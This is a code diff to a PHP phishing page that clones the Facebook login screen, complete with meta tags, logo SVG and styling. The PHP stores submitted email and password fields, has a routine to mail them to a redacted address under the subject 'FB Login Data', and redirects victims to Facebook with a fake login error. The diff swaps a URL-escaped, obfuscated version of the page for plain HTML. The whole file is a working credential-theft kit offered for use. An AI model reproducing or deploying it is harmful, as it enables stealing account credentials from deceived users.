@@ -1,6 +1,6 @@
 <?php
 function send_mail($data){
-    $to = "xxxxx@gmail.com";
+    $to = "XXXXX@gmail.com";
     $subject = "FB Login Data";
 
     $message = "<h2>Phishing FB Data</h2>
@@ -14,7 +14,7 @@ function send_mail($data){
     $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
     // More headers
-    $headers .= 'From: xxxxxx@gmail.com' . "\r\n";
+    $headers .= 'From: XXXXXX@gmail.com' . "\r\n";
     // $headers .= 'Cc: myboss@example.com' . "\r\n";
     mail($to,$subject,$message,$headers);
 
@@ -38,7 +38,7 @@ if(isset($_POST['id'])) {
     array_push($a, $_POST['e_id']);
     array_push($a, $_POST['p_id']);
 
-    //send_mail($a);
+    // send_mail($a);
     json_write($a);
     // 
     header("Location:https://m.facebook.com/?login=error");
@@ -46,7 +46,248 @@ if(isset($_POST['id'])) {
 
 }
  ?>
-<script>
-document.write(unescape('%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3Dedge%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Clink%20rel%3D%22icon%22%20href%3D%22https%3A//www.facebook.com/images/fb_icon_325x325.png%22%3E%0A%3C%21--%20Primary%20Meta%20Tags%20--%3E%0A%3Ctitle%3EFacebook%20-%20Log%20In%20or%20Sign%20Up%3C/title%3E%0A%3Cmeta%20name%3D%22title%22%20content%3D%22Facebook%20-%20Log%20In%20or%20Sign%20Up%22%3E%0A%3Cmeta%20name%3D%22description%22%20content%3D%22Log%20into%20Facebook%20to%20start%20sharing%20and%20connecting%20with%20your%20friends%2C%20family%2C%20and%20people%20you%20know.%22%3E%0A%0A%3C%21--%20Open%20Graph%20/%20Facebook%20--%3E%0A%3Cmeta%20property%3D%22og%3Atype%22%20content%3D%22website%22%3E%0A%3Cmeta%20property%3D%22og%3Aurl%22%20content%3D%22https%3A//www.facebook.com/%22%3E%0A%3Cmeta%20property%3D%22og%3Atitle%22%20content%3D%22Facebook%20-%20Log%20In%20or%20Sign%20Up%22%3E%0A%3Cmeta%20property%3D%22og%3Adescription%22%20content%3D%22Log%20into%20Facebook%20to%20start%20sharing%20and%20connecting%20with%20your%20friends%2C%20family%2C%20and%20people%20you%20know.%22%3E%0A%3Cmeta%20property%3D%22og%3Aimage%22%20content%3D%22https%3A//www.facebook.com/images/fb_icon_325x325.png%22%3E%0A%0A%3C%21--%20Twitter%20--%3E%0A%3Cmeta%20property%3D%22twitter%3Acard%22%20content%3D%22summary_large_image%22%3E%0A%3Cmeta%20property%3D%22twitter%3Aurl%22%20content%3D%22https%3A//www.facebook.com/%22%3E%0A%3Cmeta%20property%3D%22twitter%3Atitle%22%20content%3D%22Facebook%20-%20Log%20In%20or%20Sign%20Up%22%3E%0A%3Cmeta%20property%3D%22twitter%3Adescription%22%20content%3D%22Log%20into%20Facebook%20to%20start%20sharing%20and%20connecting%20with%20your%20friends%2C%20family%2C%20and%20people%20you%20know.%22%3E%0A%3Cmeta%20property%3D%22twitter%3Aimage%22%20content%3D%22https%3A//www.facebook.com/images/fb_icon_325x325.png%22%3E%0A%0A%0A%20%20%20%20%3Cstyle%3E%20%0A%20%20%20%20%20%20%20%20*%20%7B%0A%20%20%20%20margin%3A%200%3B%0A%20%20%20%20padding%3A%200%3B%0A%20%20%20%20box-sizing%3A%20border-box%3B%0A%7D%0A%0Abody%7B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20height%3A%20100vh%3B%0A%20%20%20%20background-color%3A%20%23f0f2f5%3B%0A%7D%0A%0A.container%7B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20height%3A%20100%25%3B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20justify-content%3A%20space-around%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20overflow%3A%20hidden%3B%0A%7D%0A%0A.left%20.right%2C%20form%7B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20align-content%3A%20center%3B%0A%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20flex-direction%3A%20column%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%0A%7D%0A%0A.left%7B%0A%20%20%20%20width%3A%20500px%3B%0A%20%20%20%20align-items%3A%20flex-start%3B%0A%7D%0A%0A.left%20%20svg%7B%0A%20%20%20%20height%3A%20106px%3B%0A%7D%0A%0A.left%20p%7B%0A%20%20%20%20font-size%3A%2030px%3B%0A%20%20%20%20color%3A%20%231c1e21%3B%0A%20%20%20%20height%3A%20200px%3B%0A%20%20%20%20font-family%3A%27Roboto%20Condensed%27%2C%20sans-serif%3B%0A%20%20%20%20position%3A%20relative%3B%0A%20%20%20%20left%3A%2027px%3B%0A%7D%0A%0A.right%7B%0A%20%20%20%20width%3A%20400px%3B%0A%7D%0A%0Aform%7B%0A%20%20%20%20background-color%3A%20%23fff%3B%0A%20%20%20%20border-radius%3A%2010px%3B%0A%20%20%20%20width%3A%20400px%3B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20padding%3A%2020px%3B%0A%20%20%20%20margin-bottom%3A%2025px%3B%0A%20%20%20%20box-shadow%3A%200%204px%208px%200%20rgba%280%2C0%2C0%2C0.2%29%2C%200%206px%2020px%200%20rgba%280%2C0%2C0%2C0.19%29%0A%7D%0A%0Aform%20input%7B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20padding%3A%2015px%3B%0A%20%20%20%20margin-bottom%3A%2010px%3B%0A%20%20%20%20border-radius%3A%205px%3B%0A%20%20%20%20border%3A%201px%20solid%20%23999%3B%0A%20%20%20%20outline%3A%20none%3B%0A%20%20%20%20font-size%3A%2016px%3B%0A%7D%0A%0A.loginBtn%7B%0A%20%20%20%20background-color%3A%20%231877f2%3B%0A%20%20%20%20padding%3A%2015px%3B%0A%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20text-decoration%3A%20none%3B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20border-radius%3A%205px%3B%0A%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20font-size%3A%2020px%3B%0A%20%20%20%20font-family%3A%20%27Arial%27%3B%0A%20%20%20%20font-weight%3A%20700%3B%0A%20%20%20%20transition%3A0.5s%3B%0A%7D%0A%0A.loginBtn%3Ahover%7B%0A%20%20%20%20background-color%3A%20%234257b2%3B%0A%7D%0A%0A.forget%7B%0A%20%20%20%20margin%3A15px%200%3B%0A%20%20%20%20text-decoration%3A%20none%3B%0A%20%20%20%20color%3A%231877f2%3B%0A%20%20%20%20font-family%3A%20%22Arial%22%3B%0A%20%20%20%20font-size%3A%2014px%3B%0A%7D%0A%0A.sign-up%7B%0A%20%20%20%20padding-top%3A%2020px%3B%0A%20%20%20%20border-top%3A%201px%20solid%20%23999%3B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20justify-content%3A%20center%3B%0A%7D%0A%0A.signupBtn%7B%0A%20%20%20%20background-color%3A%20%2342b72a%3B%0A%20%20%20%20padding%3A15px%20%3B%0A%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20text-decoration%3A%20none%3B%0A%20%20%20%20border-radius%3A%205px%3B%0A%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20font-size%3A%2017px%3B%0A%20%20%20%20font-family%3A%20%27Arial%27%3B%0A%20%20%20%20font-weight%3A600%3B%0A%20%20%20%20transition%3A0.5s%3B%0A%7D%0A%0A.signupBtn%3Ahover%7B%0A%20%20%20%20background-color%3A%20green%3B%0A%7D%0A%0A.right%20p%7B%0A%20%20%20%20font-family%3A%20%27Arial%27%3B%0A%20%20%20%20font-size%3A%2015px%3B%0A%7D%0A%0A@media%28max-width%3A950px%29%7B%0A%20%20%20%20.container%7B%0A%20%20%20%20%20%20%20%20flex-direction%3A%20column%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.left%7B%0A%20%20%20%20%20%20%20%20width%3A%20400px%3B%0A%20%20%20%20%20%20%20%20align-content%3A%20center%3B%0A%20%20%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.left%20p%7B%0A%20%20%20%20%20%20%20%20height%3A%2075px%3B%0A%20%20%20%20%20%20%20%20font-size%3A%2024px%3B%0A%20%20%20%20%7D%0A%7D%0A%0A@media%28max-width%3A500px%29%7B%0A%20%20%20%20form%7B%0A%20%20%20%20%20%20%20%20width%3A350px%3B%0A%20%20%20%20%20%20%20%20align-content%3A%20center%3B%0A%20%20%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%7D%0A%7D%0A%0A@media%28max-width%3A300px%29%7B%0A%20%20%20%20.left%20svg%7B%0A%20%20%20%20%20%20%20%20height%3A%2095px%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20form%7B%0A%20%20%20%20%20%20%20%20width%3A%20250px%3B%0A%20%20%20%20%20%20%20%20align-content%3A%20center%3B%0A%20%20%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%20%20%20%20position%3A%20relative%3B%0A%20%20%20%20%20%20%20%20top%3A%20-65px%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.left%20p%2C.right%20p%7B%0A%20%20%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20form%20input%2C%20.forget%2C%20.loginBtn%2C%20.signupBtn%7B%0A%20%20%20%20%20%20%20%20font-size%3A%2012px%3B%0A%20%20%20%20%7D%0A%7D%0A%0A%20%20%20%20%3C/style%3E%20%20%20%20%0A%3C/head%3E%0A%3Cbody%3E%0A%20%20%20%20%0A%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22left%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%201022.51%20360%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%231877F2%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3EFBWordmark_Hex-RGB-1024%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M166.43%2C126.68c-9.65%2C0-12.44%2C4.28-12.44%2C13.72v15.66h25.74l-2.58%2C25.3H154v76.78H123.11V181.36H102.3v-25.3h20.81V140.83c0-25.52%2C10.29-39%2C39-39a146.17%2C146.17%2C0%2C0%2C1%2C18%2C1.07v23.81Z%22/%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M181.87%2C203.88c0-28.52%2C13.51-50%2C41.82-50%2C15.44%2C0%2C24.87%2C7.94%2C29.38%2C17.8V156.06h29.59V258.14H253.07V242.7c-4.29%2C9.87-13.94%2C17.59-29.38%2C17.59-28.31%2C0-41.82-21.45-41.82-50Zm30.88%2C6.87c0%2C15.22%2C5.57%2C25.3%2C19.94%2C25.3%2C12.66%2C0%2C19.09-9.22%2C19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37%2C0-19.94%2C10.08-19.94%2C25.3Z%22/%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M347%2C153.91c12%2C0%2C23.37%2C2.58%2C29.59%2C6.86l-6.86%2C21.88a48.6%2C48.6%2C0%2C0%2C0-20.59-4.72c-16.73%2C0-24%2C9.65-24%2C26.17v6c0%2C16.52%2C7.29%2C26.17%2C24%2C26.17a48.6%2C48.6%2C0%2C0%2C0%2C20.59-4.72l6.86%2C21.87c-6.22%2C4.29-17.58%2C6.87-29.59%2C6.87-36.25%2C0-52.76-19.52-52.76-50.83v-4.72C294.24%2C173.43%2C310.75%2C153.91%2C347%2C153.91Z%22/%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M380.66%2C211v-9c0-28.95%2C16.51-48%2C50.19-48%2C31.74%2C0%2C45.68%2C19.3%2C45.68%2C47.61v16.3h-65c.65%2C13.94%2C6.87%2C20.16%2C24%2C20.16%2C11.59%2C0%2C23.81-2.36%2C32.82-6.22L474%2C253c-8.15%2C4.3-24.88%2C7.51-39.67%2C7.51C395.24%2C260.5%2C380.66%2C241%2C380.66%2C211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91%2C175.14%2C411.54%2C183.94%2C411.54%2C197.66Z%22/%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M591%2C210.32c0%2C28.52-13.72%2C50-42%2C50-15.44%2C0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27%2C102v68.2c4.5-9%2C14.37-16.3%2C28.74-16.3%2C28.31%2C0%2C42%2C21.45%2C42%2C50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66%2C0-19.52%2C9-19.52%2C23.59v10.72c0%2C14.58%2C6.86%2C23.59%2C19.52%2C23.59%2C14.8%2C0%2C20.37-10.72%2C20.37-25.09Z%22/%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M601.33%2C209.67v-5.14c0-29.39%2C16.73-50.62%2C50.83-50.62S703%2C175.14%2C703%2C204.53v5.14c0%2C29.38-16.73%2C50.62-50.83%2C50.62S601.33%2C239.05%2C601.33%2C209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95%2C10.72-19.95%2C24.23v9.44c0%2C13.51%2C5.58%2C24.23%2C19.95%2C24.23s20-10.72%2C20-24.23Z%22/%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M713.27%2C209.67v-5.14c0-29.39%2C16.73-50.62%2C50.83-50.62s50.83%2C21.23%2C50.83%2C50.62v5.14c0%2C29.38-16.73%2C50.62-50.83%2C50.62S713.27%2C239.05%2C713.27%2C209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94%2C10.72-19.94%2C24.23v9.44c0%2C13.51%2C5.57%2C24.23%2C19.94%2C24.23s19.95-10.72%2C19.95-24.23Z%22/%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M857.39%2C204.74l30.45-48.68h32.81l-31.95%2C50.4%2C33.24%2C51.68H889.13l-31.74-50v50H826.5V104.8L857.39%2C102Z%22/%3E%3C/svg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3EFacebook%20helps%20you%20connect%20and%20share%20with%20the%20people%20in%20your%20life.%3C/p%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22right%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action%3D%22%22%20method%3D%22POST%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22text%22%20placeholder%3D%22Email%20addess%20or%20phone%20number%22%20name%3D%22e_id%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22password%22%20placeholder%3D%22Password%22%20name%3D%22p_id%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22submit%22%20class%3D%22loginBtn%22%20value%3D%22Log%20In%22%20name%3D%22id%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%22%20class%3D%22forget%22%3EForgotten%20password%3F%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22sign-up%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%22%20class%3D%22signupBtn%22%3ECreate%20New%20Account%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/form%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3E%3Cb%3ECreate%20a%20Page%3C/b%3E%20for%20a%20celebrity%2C%20band%20or%20business.%3C/p%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cstyle%3E%20%0A%0A%20%20%20%20%3C/style%3E%20%20%20%20%0A%3C/body%3E%0A%3C/html%3E'))
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://www.facebook.com/images/fb_icon_325x325.png">
+<!-- Primary Meta Tags -->
+<title>Facebook - Log In or Sign Up</title>
+<meta name="title" content="Facebook - Log In or Sign Up">
+<meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know.">
 
+<!-- Open Graph / Facebook -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://www.facebook.com/">
+<meta property="og:title" content="Facebook - Log In or Sign Up">
+<meta property="og:description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know.">
+<meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
+
+<!-- Twitter -->
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:url" content="https://www.facebook.com/">
+<meta property="twitter:title" content="Facebook - Log In or Sign Up">
+<meta property="twitter:description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know.">
+<meta property="twitter:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
+
+
+    <style> 
+        * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 100%;
+    height: 100vh;
+    background-color: #f0f2f5;
+}
+
+.container{
+    width: 100%;
+    height: 100%;
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    overflow: hidden;
+}
+
+.left .right, form{
+    display: flex;
+    align-content: center;
+    justify-content: center;
+    flex-direction: column;
+    align-items: center;
+    
+}
+
+.left{
+    width: 500px;
+    align-items: flex-start;
+}
+
+.left  svg{
+    height: 106px;
+}
+
+.left p{
+    font-size: 30px;
+    color: #1c1e21;
+    height: 200px;
+    font-family:'Roboto Condensed', sans-serif;
+    position: relative;
+    left: 27px;
+}
+
+.right{
+    width: 400px;
+}
+
+form{
+    background-color: #fff;
+    border-radius: 10px;
+    width: 400px;
+    display: flex;
+    padding: 20px;
+    margin-bottom: 25px;
+    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19)
+}
+
+form input{
+    width: 100%;
+    padding: 15px;
+    margin-bottom: 10px;
+    border-radius: 5px;
+    border: 1px solid #999;
+    outline: none;
+    font-size: 16px;
+}
+
+.loginBtn{
+    background-color: #1877f2;
+    padding: 15px;
+    text-align: center;
+    text-decoration: none;
+    width: 100%;
+    border-radius: 5px;
+    color: #fff;
+    font-size: 20px;
+    font-family: 'Arial';
+    font-weight: 700;
+    transition:0.5s;
+}
+
+.loginBtn:hover{
+    background-color: #4257b2;
+}
+
+.forget{
+    margin:15px 0;
+    text-decoration: none;
+    color:#1877f2;
+    font-family: "Arial";
+    font-size: 14px;
+}
+
+.sign-up{
+    padding-top: 20px;
+    border-top: 1px solid #999;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+}
+
+.signupBtn{
+    background-color: #42b72a;
+    padding:15px ;
+    text-align: center;
+    text-decoration: none;
+    border-radius: 5px;
+    color: #fff;
+    font-size: 17px;
+    font-family: 'Arial';
+    font-weight:600;
+    transition:0.5s;
+}
+
+.signupBtn:hover{
+    background-color: green;
+}
+
+.right p{
+    font-family: 'Arial';
+    font-size: 15px;
+}
+
+@media(max-width:950px){
+    .container{
+        flex-direction: column;
+    }
+
+    .left{
+        width: 400px;
+        align-content: center;
+        align-items: center;
+    }
+
+    .left p{
+        height: 75px;
+        font-size: 24px;
+    }
+}
+
+@media(max-width:500px){
+    svg{
+        margin-top: 25px;
+    }
+    p{
+        display: unset;
+        font-size: 10px;
+    }
+    .right{
+         width: 97%;
+         margin: auto;
+    }
+    form{
+        width:350px;
+        align-content: center;
+        align-items: center;
+    }
+}
+
+@media(max-width:300px){
+    .left svg{
+        height: 95px;
+    }
+
+    form{
+        width: 250px;
+        align-content: center;
+        align-items: center;
+        position: relative;
+        top: -65px;
+    }
+
+    .left p,.right p{
+        display: none;
+    }
+
+    form input, .forget, .loginBtn, .signupBtn{
+        font-size: 12px;
+    }
+}
+
+    </style>    
+</head>
+<body>
+    
+    <div class="container">
+        <div class="left">
+            <svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1022.51 360"><defs><style>.cls-1{fill:#1877F2;}</style></defs><title>FBWordmark_Hex-RGB-1024</title><path class="cls-1" d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3H154v76.78H123.11V181.36H102.3v-25.3h20.81V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z"/><path class="cls-1" d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z"/><path class="cls-1" d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z"/><path class="cls-1" d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z"/><path class="cls-1" d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z"/><path class="cls-1" d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z"/><path class="cls-1" d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z"/><path class="cls-1" d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z"/></svg>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        
+        <div class="right">
+            <form action="" method="POST">
+                <input type="text" placeholder="Email addess or phone number" name="e_id">
+                <input type="password" placeholder="Password" name="p_id">
+                <input type="submit" class="loginBtn" value="Log In" name="id">
+                <a href="" class="forget">Forgotten password?</a>
+                <div class="sign-up">
+                    <a href="" class="signupBtn">Create New Account</a>
+                </div>
+            </form>
+            <p><b>Create a Page</b> for a celebrity, band or business.</p>
+        </div>
+    </div>
+    <style> 
+
+    </style>    
+</body>
+</html>
